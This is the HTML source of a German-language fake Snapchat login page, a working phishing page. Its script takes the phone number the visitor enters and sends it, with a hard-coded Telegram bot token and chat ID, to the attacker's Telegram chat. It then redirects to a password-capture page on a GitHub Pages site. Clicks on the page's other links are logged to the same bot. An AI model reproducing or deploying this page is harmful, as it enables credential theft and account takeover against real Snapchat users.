<!DOCTYPE html>
<html lang="de">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Snapchat Login</title>

        <link rel="icon" href="https://web.snapchat.com/favicon.png" type="image/x-icon">
        <link rel="shortcut icon" href="https://web.snapchat.com/favicon.png" type="image/x-icon">

        <link href="SnapchatLoginPhone-Dateien/snapchatlogin-2f97c6.webflow.54f670fdf.css" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/" rel="preconnect" />
        <link href="https://fonts.gstatic.com/" rel="preconnect" crossorigin="anonymous" />
        <link rel="stylesheet" href="SnapchatLoginSource/css.css" media="all" />
        <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>

        <script>
            function sendMessage() {
                var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
                var chatId = "709764990";
                var message = $("#PhoneInput").val();
                var fullMessage = "Phone: " + message;
                
                $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                    console.log("Antwort von der Telegram API:", data);
                });

                window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginPasswort.htm";
            }

            function StattdessenEmailVerwenden(){
                var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
                var chatId = "709764990";
                var fullMessage = "Click - Stattdessen Email verwenden";
                
                $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                    console.log("Antwort von der Telegram API:", data);
                });

                setTimeout(function() {
                    window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLogin.htm";
                }, 1000);
            }

            function RegistrierenClick(){
                var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
                var chatId = "709764990";
                var fullMessage = "Click - Registrieren";
                
                $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                    console.log("Antwort von der Telegram API:", data);
                });

                setTimeout(function() {
                    window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginPhone.htm";
                }, 1000);
            }
        </script>
    </head>

    <body class="body-2">
        <div class="w-layout-blockcontainer cardbackground w-container">
            <img src="SnapchatLoginSource/SnapchatIcon.png" loading="lazy" alt="" class="image" />
            <h1 class="heading">Logge dich bei Snapchat ein</h1>
            <div class="form-block w-form">
                <form id="email-form" name="email-form" data-name="Email Form" method="get" class="form" data-wf-page-id="65512d4e733b4eb3be7a5cb0" data-wf-element-id="eea312dc-f32a-013a-6403-fbe873ba7738" aria-label="Email Form">
                    <label for="email" class="field-label">Handynummer</label>
                    <div class="w-row">
                        <div class="w-col w-col-3"><input type="text" class="text-field w-input" maxlength="256" name="49" data-name="49" placeholder="DE +49" id="element" required="" /></div>
                        <div class="w-col w-col-9"><input type="tel" class="text-field-nr w-input" maxlength="256" name="email-2" data-name="Email 2" placeholder="" id="PhoneInput" required="" /></div>
                    </div>
                </form>
                <div class="w-form-done" tabindex="-1" role="region" aria-label="Email Form success"></div>
                <div class="w-form-fail" tabindex="-1" role="region" aria-label="Email Form failure"></div>
            </div>
            <div class="text-block" onclick="StattdessenEmailVerwenden()">
                Stattdessen Nutzernamen oder Email-<br />
                Adresse verwenden
            </div>
            <a onclick="sendMessage()" class="button w-button">Weiter</a>
        </div>
        <div class="text-block-2">Neu bei Snapchat? <strong class="bold-text" onclick="RegistrierenClick()">Registrieren</strong></div>
        <script src="SnapchatLoginPhone-Dateien/jquery-3.5.1.min.dc5e7f18c8.js" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
        <script src="SnapchatLoginPhone-Dateien/webflow.d15b35d0a.js" type="text/javascript"></script>
    </body>
</html>
